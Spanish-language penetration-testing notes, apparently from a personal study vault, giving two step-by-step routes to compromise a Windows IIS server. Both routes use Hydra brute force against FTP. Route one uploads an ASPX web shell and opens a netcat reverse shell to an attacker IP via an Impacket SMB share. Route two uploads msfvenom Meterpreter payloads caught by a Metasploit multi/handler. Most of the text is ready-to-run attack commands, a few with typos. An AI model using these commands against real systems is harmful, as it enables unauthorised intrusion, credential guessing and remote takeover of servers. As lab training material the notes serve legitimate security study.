## OPCION 1

Conseguir acceso remoto a un servidor que este ejecutando IIS, se da en maquinas Windows. Al subir un archivo .ASPX podemos introducir código malicioso para conseguir una intrusión remota.

Hacemos para empezar un [[00. Apuntes/01. Herramientas/NMAP|NMAP]] hacia las maquina
Vemos que esta levantado el servicio Microsoft IIS
Después debemos de hacer FUZZING sobre la IP para ver que mas podemos encontrar, usaremos DIRB
`dirb http://<Ip_Victima>`

Al no encontrar nada deberemos de probar haciendo fuerza bruta al protocolo FTP con [[HYDRA]]
`hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt ftp://<Ip_Victima`

Obtendremos un Usuario y Contraseña para poder acceder vía FTP
Una vez hayamos accedido usamos el comando `dir` para ver los directorios
Una vez tenemos acceso a los archivos debemos crear un archivo .ASPX, en Kali hay un archivo con esta extensión ya, lo podremos buscar con el siguiente comando
`find / -name cmdasp.aspx 2>/dev/null` deberemos copiarlo a nuestro directorio actual de trabajo.

Para subir el archivo al servidor ISS podemos usar el comando `put <nopmbre_del_archivo-aspx` dentro del servidor, ahora desde el navegador podemos apuntar hacia el archivo. Obtendremos un cuadro de texto en el que podremos ejecutar comandos .

Deberemos de ejecutar un comando el cual nos crea un recurso compartida que aloja un netcat.exe y desde ahí podemos acceder a la maquina victima.
El archivo lo buscamos en Kali con el siguiente comando `find / -name nc.exe 2>/dev/null`, nos lo copiamos al directorio de trabajo.

Vamos a alojar un recurso compartido con IMPACKET `impacket-smbserver recurso $(pwd) -smb2support`

En otra pestaña nos ponemos a escuchar con [[NETCAT]] 
`nc -lvnp 444`

Ahora en el navegador introducimos el siguiente comando
`\\<Ip_Atacante>\recurso\nc.exe -e cmd.exe <Ip_Atacante> 444`

Así obtendremos una ReverseShell.
Ahora deberemos de escalar esta sesión a un Meterpreter para poder realizar una escalada de privilegios.
Usaremos la herramienta [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]] con el siguiente comando
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Ip_Atacante> LPORT=444 -f exe -o shell.exe`

Este archivo le compartimos con la maquina victima, podemos probar con `wget` o `curl` y así compartirlo con un servido HTTP de Python, en caso de que no este instalados tendremos que levantar de nuevo otro recurso compartido `impacket-smbserver recurso $(pwd) -smb2support`.
En la maquina victima nos ubicamos en un directorio en el que tengamos permisos de escritura como es `temp` en el nos podemos bajar el archivo shell.exe usando el comando `copy \\<Ip_Atacante>\recurso\shell.exe shell.exe`

Una vez tenemos el archivo en la maquina victima nos abrimos Metasploit y nos ponemos en escucha para poder recibir la sesión del Meterpreter
`use multi/handler`
`show options`
`set LHOST <Ip_Atacante>`
`set LPORT 444`
`set PAYLOAD windows/meterpreter/reverse_tcp` El creado con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
`run`

Ahora en la maquina victima en la que tenemos el archivo `shell.exe` lo ejecutamos con el comando `shell.exe` y obtendremos una sesión de Meterpreter 

## OPCION 2

Los primeros pasos del reconocimiento son los mismos

Después crearemos un archivo malicioso con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=>Ip_Atacante> LPORT=444 -f aspx -o shell.aspx`

Ahora accedemos vía FTP
Copiamos el archivo creado con [[00. Apuntes/01. Herramientas/MSFVENOM]] `put shell.aspx`
Nos ponemos a la escucha con Metasploit
`use multi/handler`
`show options`
`set LHOST <Ip_Atacante>`
`set LPORT 444`
`set PAYLOAD windows/meterpreter/reverse_tcp` El creado con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
`run`

Ejecutamos el fichero subido desde el navegador poniendo la IP de la maquina y el nombre del fichero .ASPX
Así obtendremos la sesión de Meterpreter